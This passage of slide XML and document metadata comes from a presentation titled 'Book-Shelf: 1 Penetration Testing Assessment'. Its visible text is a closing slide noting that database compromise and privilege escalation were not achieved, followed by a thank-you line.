              <a:t>Database compromise was NOT achieved</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="228600" indent="-228600">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="1400"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Successful privilege escalation was NOT demonstrated</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="5806440"/>
            <a:ext cx="7315200" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Thank you — questions welcome.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="5806440"/>
            <a:ext cx="3474720" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="r" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Mohammed Hany Mamdouh</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Book-Shelf: 1 Penetration Testing Assessment</dc:title>
  <dc:subject>PptxGenJS Presentation</dc:subject>
  <dc:creator>Mohammed Hany Mamdouh</dc:creator>
  <cp:lastModifiedBy>Mohammed Hany Mamdouh</cp:lastModifiedBy>
  <cp:revision>1</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2026-08-27T08:57:51Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-08-27T08:57:51Z</dcterms:modified>
</cp:coreProperties>
</file>